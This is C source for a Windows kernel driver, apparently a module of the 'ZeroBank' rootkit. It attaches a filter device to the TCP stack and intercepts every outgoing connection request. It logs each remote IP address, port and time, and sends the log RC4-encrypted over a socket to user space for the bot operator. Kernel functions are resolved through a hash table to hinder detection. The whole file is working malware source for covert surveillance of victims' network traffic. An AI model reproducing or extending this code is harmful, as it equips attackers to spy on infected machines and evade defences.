#include "common.h"

PIO_STACK_LOCATION g_pStackLocation = NULL;
PZEROBANK_FILTER_HEAD g_filter_head = NULL;

PZEROBANK_FILTER_HEAD rk_get_number_of_bot_connections() {
	PTDI_REQUEST_KERNEL_CONNECT pconnect = NULL;
	PTA_ADDRESS paddress = NULL;
	PTDI_ADDRESS_IP paddressip = NULL;
	ROOTKIT_NETWORK_ADDRESS data = { 0 };
	char buffer[255] = { 0 };
	LARGE_INTEGER systime;
	LARGE_INTEGER lctime;
	TIME_FIELDS timer;
	PZEROBANK_FILTER_CONNECTION_REQUESTS pConnectionsBuffer = NULL;

	pconnect = (PTDI_REQUEST_KERNEL_CONNECT)(&g_pStackLocation->Parameters);
	if (pconnect) {
		paddress = ((PTRANSPORT_ADDRESS)(pconnect->RequestConnectionInformation->RemoteAddress))->Address;
		if (paddress) {
			paddressip = (PTDI_ADDRESS_IP)(paddress->Address);
			if (paddressip) {

				unsigned int Address = paddressip->in_addr;
				unsigned int Port = paddressip->sin_port;

				ROOTKIT_NETWORK_ADDRESS data = { 0 };
				data.ip[0] = ((char*)&Address)[0];
				data.ip[1] = ((char*)&Address)[1];
				data.ip[2] = ((char*)&Address)[2];
				data.ip[3] = ((char*)&Address)[3];


				data.Port[0] = ((char*)&Port)[1];
				data.Port[1] = ((char*)&Port)[0];
				Port = data.Port[1] * 0x100 + data.Port[0];

				KeQuerySystemTime(&systime);
				ExSystemTimeToLocalTime(&systime, &lctime);
				RtlTimeToTimeFields(&lctime, &timer);

				g_Hash._sprintf_s(buffer, 255, "\r\n%02u-%02u-%04u %02u:%02u:%02u [%d.%d.%d.%d:%d]",
					timer.Day,
					timer.Month,
					timer.Year,
					timer.Hour,
					timer.Minute,
					timer.Second,
					(unsigned int)data.ip[0],
					(unsigned int)data.ip[1],
					(unsigned int)data.ip[2],
					(unsigned int)data.ip[3],
					(unsigned int)Port);

				DbgPrint(buffer);

				pConnectionsBuffer = (PZEROBANK_FILTER_CONNECTION_REQUESTS)ExAllocatePool(NonPagedPool, sizeof(ZEROBANK_FILTER_CONNECTION_REQUESTS));
				memset(pConnectionsBuffer, 0, sizeof(ZEROBANK_FILTER_CONNECTION_REQUESTS));

				memcpy(pConnectionsBuffer->ShareData, buffer, 255);
				
				// lock the list and raise IRQL -> DISPATCH_LEVEL
				
				KeAcquireSpinLock(&g_globalspinlock, &Irql);
				
				// store the information
				
				InsertTailList(&g_filter_head->Entry, &pConnectionsBuffer->Entry);
				
				// release the lock
				
				KeReleaseSpinLock(&g_globalspinlock, Irql);

				// increment the connections
				
				g_filter_head->NumberOfConnections++;

			}
		}
	}

	return g_filter_head->NumberOfConnections;
}

ULONG g_rk_copy_connections_to_buffer(IN PZEROBANK_FILTER_CONNECTION_REQUESTS pConnectionsRequest) {

	PZEROBANK_FILTER_CONNECTION_REQUESTS pBuffer = NULL;
	ULONG neededsize = 0;

	if (g_filter_head == NULL)
		return 1;

	// lock the list
	
	KeAcquireSpinLock(&g_globalspinlock, &Irql);

	// extract data from list and copy it in allocated buffer
	
	while (!IsListEmpty(&g_filter_head->Entry)) {

		pBuffer = (PZEROBANK_FILTER_CONNECTION_REQUESTS)RemoveTailList(&g_filter_head->Entry);
		kimemcpy(pConnectionsRequest, pBuffer, sizeof(ZEROBANK_FILTER_CONNECTION_REQUESTS));
		ExFreePool(pBuffer);
		pConnectionsRequest++;
		neededsize++;
	}

	// release the lock
	
	KeReleaseSpinLock(&g_globalspinlock, Irql);

	ExFreePool(g_filter_head);
	g_filter_head = NULL;

	return neededsize*sizeof(ZEROBANK_FILTER_CONNECTION_REQUESTS);
	
}

BOOLEAN g_rk_send_connections_to_userspace(IN PFILE_OBJECT pSocket, IN PROOTKIT_API_HASH Hash) {

	PMDL Mdl = NULL;
	PZEROBANK_FILTER_CONNECTION_REQUESTS pConnnections = NULL;
	ULONG bytes = 0;
	INT sendsize = 0;
	PVOID Buffer = NULL;
	ULONG returnedbytes = 0;
	BOOLEAN g_cond = FALSE;

	// get how many bytes we are going to need for allocation
	
	bytes = g_filter_head->NumberOfConnections*sizeof(ZEROBANK_FILTER_CONNECTION_REQUESTS);

	do
	{
		// send needed-size to user-space 
		
		sendsize = send(pSocket, (PCHAR)&bytes, sizeof(ULONG));
		if (sendsize > 0)
		{
			// allocate virtual memory
			
			Buffer = KiAllocateMappedVirtualMemory(bytes, 'kbot', &Mdl, Hash);
			if (Buffer && Hash->_MmIsAddressValid(Buffer) && KiIsMdlAdddressValid(Mdl, Hash) == TRUE)
			{
				pConnnections = (PZEROBANK_FILTER_CONNECTION_REQUESTS)Buffer;
				if (pConnnections && Hash->_MmIsAddressValid(pConnnections))
				{
					returnedbytes = g_rk_copy_connections_to_buffer(pConnnections);
					if (returnedbytes > 0)
					{
						// send encrypted data to user-space
						
						sendsize = tdi_send_crypted(pSocket, RC4_KEY_2, (PZEROBANK_FILTER_CONNECTION_REQUESTS)pConnnections, returnedbytes,0);
						if (sendsize > 0)
						{
							g_cond = TRUE;
							goto clean;
						}
					}
				}
			}
		}


	} while (FALSE);

	// free previously allocated virtual memory
	
clean:
	KiFreeMappedVirtualMemory(Buffer, 'kbot', Mdl, Hash);
	Buffer = NULL;

	return g_cond;
}

NTSTATUS g_rk_connect_dispatcher(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {

	NTSTATUS st = STATUS_NOT_SUPPORTED;
	g_pStackLocation = pIrp->Tail.Overlay.CurrentStackLocation;	// get the current Irp Stack Location

	__try {
		
		// since we are only interested in IRP_MJ_INTERNAL_DEVICE_CONTROL we just gather
		// the MinorFunction data

		switch (g_pStackLocation->MinorFunction) {
		case TDI_CONNECT:	// connection requests
			rk_get_number_of_bot_connections();
			break;
		case TDI_QUERY_INFORMATION:	// query information requests
			break;
		case TDI_SEND:		// sending requests
			break;	
		case TDI_RECEIVE:	// receiving requests
			break;	
		default:
			break;
		}
		

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		return GetExceptionCode();
		KdPrint(("\r\nException Caught in TDI_DISPATCHER_ROUTINE"));
	}

	// Call the underlying driver, Note that we use DeviceExtension field which should be
	// filled with data just after creating the device in g_rk_connect_start_filter function

	IoSkipCurrentIrpStackLocation(pIrp);
	st = g_Hash._IofCallDriver((PDEVICE_OBJECT)pDeviceObject->DeviceExtension, pIrp);

	return st;
}

NTSTATUS g_rk_connect_start_filter(IN PZEROBANK_TDI_FILTER tdi) {
	
	PDEVICE_OBJECT pDeviceObject = NULL;
	UNICODE_STRING device = { 0 };
	NTSTATUS st;
	UINT16 i = 0;

	st = tdi->Hash->_IoCreateDevice(tdi->pDriverObject, sizeof(PDEVICE_OBJECT),	NULL,FILE_DEVICE_UNKNOWN,FILE_DEVICE_SECURE_OPEN,FALSE,(PDEVICE_OBJECT*)&pDeviceObject);
	if (NT_SUCCESS(st)) {
		for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
			tdi->pDriverObject->MajorFunction[i] = g_rk_connect_dispatcher;
		}
		tdi->Hash->_RtlInitUnicodeString(&device, L"\\Device\\tcp");
		st = tdi->Hash->_IoAttachDevice(pDeviceObject, &device, (PDEVICE_OBJECT*)&pDeviceObject->DeviceExtension);
		if (NT_SUCCESS(st)) {

			PDEVICE_OBJECT fltdriverobj = (PDEVICE_OBJECT)pDeviceObject->DeviceExtension;
			if (fltdriverobj) {
				pDeviceObject->Flags |= fltdriverobj->Flags &(DO_BUFFERED_IO | DO_DIRECT_IO);
				pDeviceObject->DeviceType = fltdriverobj->DeviceType;
				pDeviceObject->Characteristics = fltdriverobj->Characteristics;
				pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
			}
		}
	}

	return st;
}
